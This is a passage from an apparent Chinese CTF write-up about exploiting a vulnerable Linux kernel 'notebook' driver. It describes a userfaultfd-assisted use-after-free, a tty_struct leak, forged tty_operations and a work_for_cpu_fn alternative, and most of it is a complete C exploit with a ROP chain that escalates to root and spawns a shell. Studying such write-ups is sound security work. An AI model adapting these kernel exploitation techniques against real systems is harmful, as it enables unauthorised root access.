<code>copy_from_user</code> 再更新 <code>note</code>
指针，因此可以考虑利用 userfaultfd 实现 UAF 。</p>
<p>在释放利用 <code>editnote</code> 释放 object 后可以大量申请
<code>tty_struct</code> 来泄露内核基址。由于 <code>notegift</code>
可以泄露 object 地址，因此可以伪造 <code>tty_operations</code>
来劫持内核执行流程。</p>
<p>劫持内核执行流程后有 ROP 和 <code>work_for_cpu_fn</code>
两种方法提权。</p>
<p>ROP 方式是在 <code>tty_operations</code> 中写入如下 gadget，由于调用
<code>tty_operations</code> 中的函数时会传入 <code>tty_struct</code>
结构体地址，因此可以将栈迁移至 <code>tty_struct</code> 。 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:FFFFFFFF81238D50 push    rdi</span><br><span class="line">.text:FFFFFFFF81238D51 pop     rsp</span><br><span class="line">.text:FFFFFFFF81238D52 pop     rbp</span><br><span class="line">.text:FFFFFFFF81238D53 add     rax, rdx</span><br><span class="line">.text:FFFFFFFF81238D56 retn</span><br></pre></td></tr></table></figure></div>
为了不破坏 <code>tty_struct</code> 结构，不能再 <code>tty_struct</code>
布置完整的 rop 而是在 <code>tty_struct</code> 对应位置写入
<code>pop rsp; ret</code> gadget 将栈迁移至一个 note 中，在 note 中写入
rop 完成提权。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> TTY_STRUCT_SIZE = <span class="number">0x2E0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> PTMX_NUM = <span class="number">100</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF810A9B40</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF8225C940</span>;</span><br><span class="line"><span class="type">size_t</span> mov_rsp_rdi_ret = <span class="number">0xffffffff81238d50</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81007115</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rsp_ret = <span class="number">0xffffffff810bc110</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF81A00929</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *(*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>, <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*open)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> file *filp);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> file *filp);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*write)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*write_room)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*ioctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios *old);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> *page;</span><br><span class="line"><span class="type">long</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">void</span> *(*handler)(<span class="type">void</span> *))</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: userfaultfd&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span> =</span> &#123;.api=UFFD_API, .features=<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    uffdio_register.range.start = (<span class="type">size_t</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line">    <span class="keyword">if</span> (pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *) uffd) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: pthread_create&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Note</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> index;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> note_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">note_add</span><span class="params">(<span class="type">size_t</span> index, <span class="type">size_t</span> size, <span class="type">void</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(note_fd, <span class="number">0x100</span>, &amp;(<span class="keyword">struct</span> Note) &#123;index, size, buf&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">note_del</span><span class="params">(<span class="type">size_t</span> index)</span> &#123;</span><br><span class="line">    ioctl(note_fd, <span class="number">0x200</span>, &amp;(<span class="keyword">struct</span> Note) &#123;.index=index&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">note_edit</span><span class="params">(<span class="type">size_t</span> index, <span class="type">size_t</span> size, <span class="type">void</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(note_fd, <span class="number">0x300</span>, &amp;(<span class="keyword">struct</span> Note) &#123;index, size, buf&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">note_gift</span><span class="params">(<span class="type">void</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(note_fd, <span class="number">100</span>, &amp;(<span class="keyword">struct</span> Note) &#123;.buf=buf&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">note_read</span><span class="params">(<span class="type">int</span> index, <span class="type">void</span> *buf)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> read(note_fd, buf, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">note_write</span><span class="params">(<span class="type">int</span> index, <span class="type">void</span> *buf)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> write(note_fd, buf, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uaf_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">long</span> uffd = (<span class="type">long</span>) arg;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = (<span class="type">int</span>) uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="type">int</span> nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: poll&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">        <span class="type">ssize_t</span> nread = read((<span class="type">int</span>) uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: EOF on userfaultfd!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: read&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Unexpected event on userfaultfd&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> ptmx_fd[PTMX_NUM];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PTMX_NUM; i++) &#123;</span><br><span class="line">            ptmx_fd[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">        &#125;</span><br><span class="line">        note_edit(<span class="number">0</span>, <span class="number">1024</span>, page);</span><br><span class="line">        note_read(<span class="number">0</span>, page);</span><br><span class="line">        qword_dump(<span class="string">&quot;leak tty_struct&quot;</span>, page, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> offset = page[<span class="number">3</span>] - <span class="number">0xffffffff81e8e440</span>;</span><br><span class="line">        commit_creds += offset;</span><br><span class="line">        init_cred += offset;</span><br><span class="line">        mov_rsp_rdi_ret += offset;</span><br><span class="line">        pop_rdi_ret += offset;</span><br><span class="line">        pop_rsp_ret += offset;</span><br><span class="line">        swapgs_restore_regs_and_return_to_usermode += offset;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> <span class="title">tty_ops</span>;</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(tty_ops) / <span class="keyword">sizeof</span>(<span class="type">size_t</span>); i++) &#123;</span><br><span class="line">            ((<span class="type">size_t</span> *) &amp;tty_ops)[i] = mov_rsp_rdi_ret;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> rop[] = &#123;</span><br><span class="line">                pop_rdi_ret,</span><br><span class="line">                init_cred,</span><br><span class="line">                commit_creds,</span><br><span class="line">                swapgs_restore_regs_and_return_to_usermode + <span class="number">0x16</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                (<span class="type">size_t</span>) get_shell,</span><br><span class="line">                user_cs,</span><br><span class="line">                user_rflags,</span><br><span class="line">                user_sp,</span><br><span class="line">                user_ss</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> buf_size = <span class="keyword">sizeof</span>(tty_ops) + <span class="keyword">sizeof</span>(rop);</span><br><span class="line">        <span class="type">char</span> buf[buf_size];</span><br><span class="line">        <span class="built_in">memcpy</span>(buf, &amp;tty_ops, <span class="keyword">sizeof</span>(tty_ops));</span><br><span class="line">        <span class="built_in">memcpy</span>(buf + <span class="keyword">sizeof</span>(tty_ops), rop, <span class="keyword">sizeof</span>(rop));</span><br><span class="line"></span><br><span class="line">        note_add(<span class="number">1</span>, <span class="number">0x50</span>, page);</span><br><span class="line">        note_edit(<span class="number">1</span>, buf_size, page);</span><br><span class="line">        note_write(<span class="number">1</span>, buf);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> notebook[<span class="number">32</span>];</span><br><span class="line">        note_gift(notebook);</span><br><span class="line">        qword_dump(<span class="string">&quot;notebook&quot;</span>, notebook, <span class="number">32</span> * <span class="number">8</span>);</span><br><span class="line">        <span class="type">size_t</span> tty_ops_addr = notebook[<span class="number">2</span>];</span><br><span class="line">        <span class="type">size_t</span> rop_addr = tty_ops_addr + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> tty_operations);</span><br><span class="line">        <span class="type">size_t</span> tty_struct_addr = notebook[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] tty_ops addr: %p\n&quot;</span>, tty_ops_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] tty_struct addr: %p\n&quot;</span>, tty_struct_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] rop addr: %p\n&quot;</span>, rop_addr);</span><br><span class="line"></span><br><span class="line">        page[<span class="number">1</span>] = pop_rsp_ret;</span><br><span class="line">        page[<span class="number">2</span>] = rop_addr;</span><br><span class="line">        page[<span class="number">3</span>] = tty_ops_addr;</span><br><span class="line">        note_write(<span class="number">0</span>, page);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PTMX_NUM; i++) &#123;</span><br><span class="line">            ioctl(ptmx_fd[i], <span class="number">0x1145141919810</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">        uffdio_copy.src = (<span class="type">size_t</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">size_t</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uffdio_copy.src: %p\n&quot;</span>, uffdio_copy.src);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uffdio_copy.dst: %p\n&quot;</span>, uffdio_copy.dst);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl((<span class="type">int</span>) uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Error at: ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status();</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    page_size = getpagesize();</span><br><span class="line">    page = (<span class="type">size_t</span> *) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, page_size);</span><br><span class="line"></span><br><span class="line">    note_fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (note_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open notebook.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    note_add(<span class="number">0</span>, <span class="number">0x50</span>, page);</span><br><span class="line">    note_edit(<span class="number">0</span>, TTY_STRUCT_SIZE, page);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *buf = (<span class="type">char</span> *) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(buf, page_size, (<span class="type">void</span> *) uaf_thread);</span><br><span class="line">    note_edit(<span class="number">0</span>, <span class="number">0x2000</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>在开启了多核支持的内核中都有 <code>work_for_cpu</code> 这个函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="type">long</span> (*fn)(<span class="type">void</span> *);</span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">    <span class="type">long</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">work_for_cpu_fn</span><span class="params">(<span class="keyword">struct</span> work_struct *work)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> *<span class="title">wfc</span> =</span> container_of(work, <span class="keyword">struct</span> work_for_cpu, work);</span><br><span class="line"></span><br><span class="line">    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 IDA 中 <code>work_for_cpu</code> 这个函数内容如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">work_for_cpu_fn</span><span class="params">(<span class="type">size_t</span> *args)</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__(args);</span><br><span class="line">  args[<span class="number">6</span>] = ((__int64 (__fastcall *)(<span class="type">size_t</span>))args[<span class="number">4</span>])(args[<span class="number">5</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>因此只需要在 <code>tty_operations</code>
中写入<code>work_for_cpu_fn</code> 函数指针，利用调用
<code>tty_operations</code> 中的函数时会传入 <code>tty_struct</code>
结构体地址这个特性在 <code>tty_struct</code>
对应位置写入要执行的函数和参数实现提权。</p>
